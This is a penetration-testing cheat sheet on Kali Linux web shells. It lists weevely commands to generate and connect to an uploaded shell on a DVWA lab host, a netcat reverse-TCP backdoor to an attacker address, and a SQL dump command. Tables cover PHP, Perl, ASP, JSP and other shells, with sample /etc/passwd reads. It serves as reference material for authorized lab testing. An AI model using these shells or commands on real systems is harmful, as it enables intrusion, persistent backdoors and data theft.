# Web Shells

The following shells exist within Kali Linux, under /usr/share/webshells/ these are only useful if you are able to upload, inject or transfer the shell to the machine.

## weevely payloads

generate:

```
weevely generate [password] [file name].php
```

connect:

```
weevely http://192.168.56.102/dvwa/hackable/uploads/shell.php [password]
```

​run a reverse tcp backdoor from weevely shell:

```
backdoor_reversetcp -vector netcat 192.168.56.1 6969
```

dump sql database with weevely:

```
sql_dump -vector mysqldump_sh -host localhost -lpath /root/dvwa-data.txt db name] [user] [passwd]
```

## Kali PHP Web Shells

Kali PHP reverse shells and command shells:



| Command                                                                               | Description                                                                                                                                                           |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| /usr/share/webshells/php/ php-reverse-shell.php                                       | Pen Test Monkey - PHP Reverse Shell                                                                                                                                   |
| /usr/share/webshells/ php/php-findsock-shell.php /usr/share/webshells/ php/findsock.c | Pen Test Monkey, Findsock Shell. Build gcc -o findsock findsock.c (be mindfull of the target servers architecture), execute with netcat not a browser nc -v target 80 |
| /usr/share/webshells/ php/simple-backdoor.php                                         | PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: http://target.com/simple- backdoor.php?cmd=cat+/etc/passwd                     |
| /usr/share/webshells/ php/php-backdoor.php                                            | Larger PHP shell, with a text input box for command execution.                                                                                                        |

{% hint style="info" %}
The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.
{% endhint %}

## Kali Perl Reverse Shell



&#x20;Kali perl reverse shell:\


| Command                                          | Description                                                                       |
| ------------------------------------------------ | --------------------------------------------------------------------------------- |
| /usr/share/webshells/perl/ perl-reverse-shell.pl | Pen Test Monkey - Perl Reverse Shell                                              |
| /usr/share/webshells/ perl/perlcmd.cgi           | Pen Test Monkey, Perl Shell. Usage: http://target.com/perlcmd.cgi?cat /etc/passwd |

## Kali Cold Fusion Shell

\
Kali Coldfusion Shell:

| Command                             | Description                       |
| ----------------------------------- | --------------------------------- |
| /usr/share/webshells/cfm/cfexec.cfm | Cold Fusion Shell - aka CFM Shell |

## Kali ASP Shell

\
Classic ASP Reverse Shell + CMD shells:

| Command                   | Description     |
| ------------------------- | --------------- |
| /usr/share/webshells/asp/ | Kali ASP Shells |

## Kali ASPX Shells

\
ASP.NET reverse shells within Kali

| Command                    | Description      |
| -------------------------- | ---------------- |
| /usr/share/webshells/aspx/ | Kali ASPX Shells |

## Kali JSP Reverse Shell

\
Kali JSP Reverse Shell:

| Command                                  | Description            |
| ---------------------------------------- | ---------------------- |
| /usr/share/webshells/jsp/jsp-reverse.jsp | Kali JSP Reverse Shell |









